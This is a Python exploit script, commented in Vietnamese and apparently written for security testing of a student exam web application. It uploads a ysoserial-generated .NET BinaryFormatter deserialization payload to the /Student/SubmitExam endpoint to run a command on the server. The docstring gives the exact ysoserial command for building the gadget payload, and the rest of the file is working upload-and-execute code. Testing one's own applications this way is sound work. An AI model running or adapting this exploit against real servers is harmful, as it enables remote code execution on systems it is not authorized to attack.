"""
Script test để khai thác lỗ hỏng Insecure Deserialization
API endpoint: POST /Student/SubmitExam

Yêu cầu:
1. Tạo payload bằng ysoserial:
   ysoserial.exe -f BinaryFormatter -g PSObject -o raw -c "calc" -t > payload.bin

2. Upload file payload.bin lên endpoint này
"""

import requests
import sys

def exploit_deserialization(base_url, token, exam_id, payload_file):
    """
    Khai thác lỗ hỏng Insecure Deserialization
    
    Args:
        base_url: URL của ứng dụng (ví dụ: http://localhost:5000)
        token: JWT token để xác thực (đặt trong cookie access_token)
        exam_id: ID của exam cần submit
        payload_file: Đường dẫn đến file payload.bin
    """
    url = f"{base_url}/Student/SubmitExam"
    
    # Đọc file payload
    with open(payload_file, 'rb') as f:
        files = {
            'file': (payload_file, f, 'application/octet-stream')
        }
        data = {
            'examId': exam_id
        }
        
        # Headers với JWT token trong cookie
        cookies = {
            'access_token': token
        }
        
        print(f"[*] Đang gửi request đến {url}")
        print(f"[*] Exam ID: {exam_id}")
        print(f"[*] Payload file: {payload_file}")
        print(f"[*] Đang upload và deserialize payload...")
        
        try:
            response = requests.post(url, files=files, data=data, cookies=cookies)
            
            print(f"\n[+] Status Code: {response.status_code}")
            print(f"[+] Response: {response.text}")
            
            if response.status_code == 200:
                print("\n[!] PAYLOAD ĐÃ ĐƯỢC DESERIALIZE!")
                print("[!] Command trong payload đã được thực thi trên server")
                print("[!] Kiểm tra server để xác nhận command đã chạy")
            else:
                print(f"\n[!] Request failed với status code: {response.status_code}")
                
        except Exception as e:
            print(f"\n[!] Lỗi: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Cách sử dụng:")
        print("  python test_deserialization.py <base_url> <jwt_token> <exam_id> <payload_file>")
        print("\nVí dụ:")
        print("  python test_deserialization.py http://localhost:5000 <token> 1 payload.bin")
        sys.exit(1)
    
    base_url = sys.argv[1]
    token = sys.argv[2]
    exam_id = int(sys.argv[3])
    payload_file = sys.argv[4]
    
    exploit_deserialization(base_url, token, exam_id, payload_file)

